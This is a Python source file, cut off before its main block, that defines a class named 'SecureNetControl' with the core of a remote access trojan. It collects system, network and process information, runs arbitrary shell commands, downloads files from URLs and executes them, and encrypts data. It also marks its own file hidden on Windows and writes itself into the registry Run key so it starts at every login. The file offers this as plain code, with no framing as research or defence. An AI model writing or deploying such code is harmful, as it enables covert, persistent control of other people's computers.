import os
import platform
import psutil
import subprocess
import requests
import ctypes
import sys
import json
from cryptography.fernet import Fernet

class SecureNetControl:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)

    def get_system_info(self):
        system_info = {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor()
        }
        return system_info

    def get_network_info(self):
        net_if_addrs = psutil.net_if_addrs()
        network_info = {}
        for interface, addrs in net_if_addrs.items():
            network_info[interface] = []
            for addr in addrs:
                info = {
                    "family": str(addr.family),
                    "address": addr.address,
                    "netmask": addr.netmask,
                    "broadcast": addr.broadcast
                }
                network_info[interface].append(info)
        return network_info

    def list_tasks(self):
        return [{"pid": proc.pid, "name": proc.name()} for proc in psutil.process_iter(attrs=['pid', 'name'])]

    def execute_command(self, command):
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return {"stdout": result.stdout, "stderr": result.stderr}

    def download_file(self, url, destination):
        response = requests.get(url)
        if response.status_code == 200:
            with open(destination, 'wb') as f:
                f.write(response.content)
            return True
        return False

    def execute_file(self, file_path):
        try:
            subprocess.Popen(file_path, shell=True)
            return True
        except Exception as e:
            return str(e)

    def encrypt_data(self, data):
        encoded_data = json.dumps(data).encode('utf-8')
        encrypted_data = self.cipher_suite.encrypt(encoded_data)
        return encrypted_data

    def decrypt_data(self, encrypted_data):
        decrypted_data = self.cipher_suite.decrypt(encrypted_data)
        return json.loads(decrypted_data.decode('utf-8'))

    def hide_self(self):
        if platform.system() == "Windows":
            ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)

    def add_to_startup(self):
        if platform.system() == "Windows":
            import winreg
            path = os.path.realpath(sys.argv[0])
            key = winreg.HKEY_CURRENT_USER
            key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
            open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(open_key, "SecureNetControl", 0, winreg.REG_SZ, path)
            winreg.CloseKey(open_key)

# Example usage:
if __name__ == "__main__":
